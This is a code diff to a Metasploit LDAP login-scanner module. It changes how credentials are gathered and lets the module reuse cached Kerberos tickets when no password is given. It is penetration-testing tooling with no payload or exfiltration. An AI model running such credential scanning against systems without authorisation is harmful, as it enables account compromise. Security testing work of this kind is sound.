@@ -89,12 +89,19 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
+    ignore_public = datastore['LDAP::Auth'] == Msf::Exploit::Remote::AuthOption::SCHANNEL
+    ignore_private =
+      datastore['LDAP::Auth'] == Msf::Exploit::Remote::AuthOption::SCHANNEL ||
+      (Msf::Exploit::Remote::AuthOption::KERBEROS && !datastore['ANONYMOUS_LOGIN'] && !datastore['PASSWORD'])
+
     cred_collection = build_credential_collection(
       username: datastore['USERNAME'],
       password: datastore['PASSWORD'],
       realm: datastore['DOMAIN'],
       anonymous_login: datastore['ANONYMOUS_LOGIN'],
-      blank_passwords: false
+      blank_passwords: false,
+      ignore_public: ignore_public,
+      ignore_private: ignore_private
     )
 
     opts = {
@@ -107,14 +114,20 @@ class MetasploitModule < Msf::Auxiliary
       ldap_cert_file: datastore['LDAP::CertFile'],
       ldap_rhostname: datastore['Ldap::Rhostname'],
       ldap_krb_offered_enc_types: datastore['Ldap::KrbOfferedEncryptionTypes'],
-      ldap_krb5_cname: datastore['Ldap::Krb5Ccname'],
-      # Write only cache so we keep all gathered tickets but don't reuse them for auth while running the module
-      kerberos_ticket_storage: kerberos_ticket_storage({ read: false, write: true })
+      ldap_krb5_cname: datastore['Ldap::Krb5Ccname']
     }
 
     realm_key = nil
     if opts[:ldap_auth] == Msf::Exploit::Remote::AuthOption::KERBEROS
       realm_key = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
+      if !datastore['ANONYMOUS_LOGIN'] && !datastore['PASSWORD']
+        # In case no password has been provided, we assume the user wants to use Kerberos tickets stored in cache
+        # Write mode is still enable in case new TGS tickets are retrieved.
+        opts[:kerberos_ticket_storage] = kerberos_ticket_storage({ read: true, write: true })
+      else
+        # Write only cache so we keep all gathered tickets but don't reuse them for auth while running the module
+        opts[:kerberos_ticket_storage] = kerberos_ticket_storage({ read: false, write: true })
+      end
     end
 
     scanner = Metasploit::Framework::LoginScanner::LDAP.new(
